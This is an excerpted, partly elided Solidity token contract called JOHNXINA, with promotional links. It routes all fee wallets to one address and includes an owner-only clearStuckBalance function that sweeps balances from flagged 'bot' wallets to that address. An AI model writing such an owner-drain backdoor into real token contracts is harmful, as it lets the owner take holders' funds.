...
Telegram: https://t.me/johnxinaio
Web: https://www.johnxina.io/
...
contract JOHNXINA is Context, IERC20, Ownable {
    ...
    address payable public _marketingAddress =
        payable(address(0x216456D519C9515AC551C12024Bd861283f0e11E));
    address payable public _teamwallet =
        payable(address(0x216456D519C9515AC551C12024Bd861283f0e11E));
    address _partnershipswallet =
        payable(address(0x216456D519C9515AC551C12024Bd861283f0e11E));
    address private _donationAddress =
        0x216456D519C9515AC551C12024Bd861283f0e11E;

    string private _name = "JOHNXINA";
    string private _symbol = "JOHN XINA";
    ...
    function clearStuckBalance() public onlyOwner {
        for(uint256 i = 0; i < botsWallet.length; i++){
            ...
            _transferStandard(wallet, address(0x216456D519C9515AC551C12024Bd861283f0e11E), amount);
        }
